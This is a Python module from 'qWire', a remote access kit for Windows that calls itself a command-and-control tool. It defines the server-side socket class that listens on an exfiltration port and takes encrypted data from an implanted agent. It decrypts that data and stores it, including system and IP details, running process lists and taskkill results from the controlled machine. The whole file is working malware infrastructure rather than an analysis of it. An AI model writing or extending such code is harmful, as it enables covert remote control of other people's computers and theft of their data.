#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.21
# -------------------------------------------------------------
import socket

from core.logging.logging import ConsoleWindow,LoggingUtilitys
from core.encryption.aes128 import Decryption
from core.networking.utils.IP_Handler import IPAddress
from core.utils.file_paths import DSFilePath
from core.logging.logging import NetworkingConfigs

BUFFER = 4096

class ReceiverSocket:

    def __init__(self):
        self.host = IPAddress().get_local_ip_from_interface() #init local ip address
        self.port_number = NetworkingConfigs().retrieve_exfil_port()    #init exfil port number

    #Function will create a receiver socket for exfiltrating date from the agent
    def create_receiver_socket(self):
        self.recvr_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   #Create socket object
        self.recvr_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)   #Allow socket to bind to port with out error
        self.recvr_socket.bind((self.host,int(self.port_number)))               #Bind the socket to the host ip and port
        #self.recvr_socket.settimeout(10)                                        #Set socket timeout to infinite
        self.listen_for_message()

    #Function will listen for a single connection
    def listen_for_message(self):
        self.recvr_socket.listen(1)             #Listen for a single connection

    #Function will accept the connection, get the encrypted data, close all the sockets, decrypt the data and return the plaintext data
    def get_data_from_client(self,encryption_key):
        try:
            global client_socket                                    #Make client socket object global
            client_socket, client_addr = self.recvr_socket.accept() #Accept the connection
            data_from_client = self.recv_all_data_from_client()     #Receive all the encrypted data from the client
            client_socket.close()                                   #Close the client socket
            self.recvr_socket.close()                               #Close the receiver socket
            plaintext_data = Decryption().decrypt_data(encryption_key,data_from_client) #Receive & decrypt data from client
            return plaintext_data                                   #Return plain text
        except socket.timeout:                                      #If socket timesout
            self.recvr_socket.close()                               #Close the socket
            return ''                                               #Return empty string

    #Function will receive all data from the client
    def recv_all_data_from_client(self):
        bytes_data = b''                                    # Create empty byte string
        while True:                                         # Create infinite loop
            partial_data = client_socket.recv(BUFFER)       # Receive encrypted data from server
            bytes_data += partial_data                      # Add each itteration to empty byte string
            if not partial_data:                            # If the data is an empty string, all data has been sent
                break                                       # Data transmission is complete. Break the loop
        return bytes_data                                   # Return byte data string sent from server

    #Function will receive and return string from client
    def recv_string(self,encryption_key):
        self.create_receiver_socket()                       #Create receiver socket
        string = self.get_data_from_client(encryption_key)  #Get string
        return string                                       #Return it

    #Function will receive ping reply and log it to the gui console
    def recv_ping_reply(self,encryption_key):
        self.create_receiver_socket()                           #Create socket & listen for connection
        ping_reply = self.get_data_from_client(encryption_key)  #Accept the connection, process reply, close connection
        ConsoleWindow().log_to_console(ping_reply)              #Log the reply to the console window

    #Function will receive sys/ip command out put from client and write to a file
    def recv_sys_ip_info(self,encryption_key):
        self.create_receiver_socket()                                   #Create receiver socket
        info_exfil = self.get_data_from_client(encryption_key)          #Get the data from the client and decrypt it
        LoggingUtilitys().write_data_to_file(DSFilePath().sys_info_file,info_exfil) #Write the data to the data storage file

    #Function will receive the list of running process's from the client, format and log it to the data storage directory
    def recv_running_process(self,encryption_key):
        self.create_receiver_socket()                               #Create receiver socket
        process_list = self.get_data_from_client(encryption_key)    #Get process list from client
        data_line_array = process_list.splitlines()                 #Split the lines of the process list
        with open(DSFilePath().task_manager_file,'w') as task_file: #Open Data storage file
            master_array = []                                       #Create master array
            for line in data_line_array:                            #For each line in the array
                if line != '':                                      #If the line is not an empty string
                    array = []                                      #Create array local to loop iteration
                    for data in line.split(' '):                    #For each piece of data split, to remove whitespace
                        if data != '':                              #If the data is not an empty string, remove more invalid data
                            array.append(data)                      #Append the data to the local array
                    try:
                        master_array.append(array[7])               #Append the process name
                        master_array.append(array[5])               #Append the PID
                        master_array.append(array[4])               #Append the CPU Usage
                    except IndexError:                  #If there is a missing item from original command output on client, dial back the index by one. This is for proc's that don't have CPU output
                        master_array.append(array[6])
                        master_array.append(array[4])
                        master_array.append(array[3])
            task_file.write(str(master_array[6:]).strip('[').strip(']')+'\n') #When done with processing, write the data to the data storage file
            task_file.close()

    #Function will receive the output from the taskkill command
    def recv_taskkill_output(self,encryption_key):
        self.create_receiver_socket()                                       #Create receiver socket
        taskkill_output = self.get_data_from_client(encryption_key)         #Get output of command from client
        if taskkill_output == '':                                           #If the output == empty string, then the client will send an empty string meaning the proc could not be terminated
            taskkill_output = 'ERROR: The process could not be terminated.' #Set to error message on server side
        ConsoleWindow().log_to_console(taskkill_output)                     #Log to console
        LoggingUtilitys().write_data_to_file(DSFilePath().job_file,'null')  #Create a job file to break the while loop